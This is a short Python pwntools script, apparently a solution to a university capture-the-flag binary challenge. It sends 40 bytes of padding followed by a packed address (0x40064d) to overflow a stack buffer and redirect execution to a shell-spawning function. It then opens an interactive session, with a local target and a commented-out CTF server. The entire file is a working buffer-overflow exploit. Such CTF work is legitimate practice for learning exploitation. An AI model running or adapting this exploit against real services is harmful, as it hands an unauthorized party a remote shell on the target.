from pwn import *

r = remote("127.0.0.1", 8888)
#r = remote("ctf.adl.csie.ncu.edu.tw", 11001)
context.arch = "amd64"

raw_input('data')

sh_func = 0x40064d
payload = "a" * 40 + p64(sh_func)



r.recvuntil(")")
r.sendline(payload)

r.interactive()

